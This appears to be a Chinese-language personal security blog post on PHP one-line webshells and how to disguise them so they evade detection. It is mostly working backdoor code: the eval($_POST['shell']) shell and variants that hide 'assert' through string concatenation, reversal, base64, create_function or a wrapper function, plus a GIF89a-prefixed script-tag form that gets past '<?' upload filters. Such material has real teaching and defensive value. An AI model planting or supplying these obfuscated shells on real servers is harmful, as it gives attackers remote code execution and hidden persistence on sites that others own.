+++
title = 'php一句话木马以及相关免杀'
date = 2024-10-13T15:27:04+08:00
draft = false
categories = ['CS', 'sec']
+++


## 基础

`<?php @eval($_POST['shell']);?>`
- @ 防止报错
- eval() 把字符串当作php代码执行
- `$_POST['xyz']` 以post方式获取名为xyz的变量

使用：访问这句木马所在的php文件，以post方式传入 xyz = phpinfo()
- 网页会（执行`phpinfo()` 这个函数）返回网页php的版本信息

---
## 变形

### assert

```php
<?php
$a = "assert";
$a(@$_POST['shell']);
?>
```

- 区别在于 `assert` 函数在执行给定代码时，要求代码的结果为布尔类型，而 `eval` 函数则可以执行任意有效的 PHP 代码

### 字符变形

使用字符串拼接、大小写混淆、字符串逆序组合而成

```php
<?php
$a="TR"."Es"."sA";  
$b=strtolower($a);  
$c=strrev($b);  
@$c($_POST['shell']);  
?>

# phpinfo();
<?php
$a="of"."NiP"."Hp";  
$b=strtolower($a);  
$c=strrev($b);  
@$c();  
?>
```

- `strtolower()` 是 PHP 中的一个内置函数，用于将字符串转换为小写字母
- `strrev()` 字符串反转

注意，字符变形仅仅用于函数名，不能写成 `$a=")(of"."NiP"."Hp";` ，不能把括号一起放入。

用解析出来的变量替代函数名，本质上只是**字符的替换**，绕过黑名单检测，最后“触发”函数的执行需要依赖括号 `()` 。假如括号也写在字符变形之中，最终由变量替换产生一串 `phpinfo()` 这样的**字符串**，php 显然不会执行这个**字符串**，所以必须把括号放在外面。



### 自定义函数

```php
<?php  
function fun($a){  
    @eval($a);  
}  
@fun($_POST['shell']);  
?>
```


### create_function

```php
<?php 
$fun = create_function('',$_POST['shell']);
$fun();
?>
```
- 用法：`$addFunction = create_function('参数', '函数体');`


### base64_decode 函数

```php
<?php   
$a=base64_decode("YXNzZXJ0");  
@a($_POST['shell']);  
?>
```

`YXNzZXJ0`是assert的base64编码，`base64_decode()`是base64解密函数


### 绕过`<?`

`GIF89a? <script language="php">eval($_REQUEST[123])</script> `
- `GIF89a`: 这是 GIF 图像文件的文件头标识符
- 剩余就是正常的html语言

---
## 短标签

![](../../../img/Pasted%20image%2020241013143113.png)

short_open_tag 开启以后，可以使用 PHP 的短标签：`<? ?>` 
- 绕过黑名单有 `php`  的情况




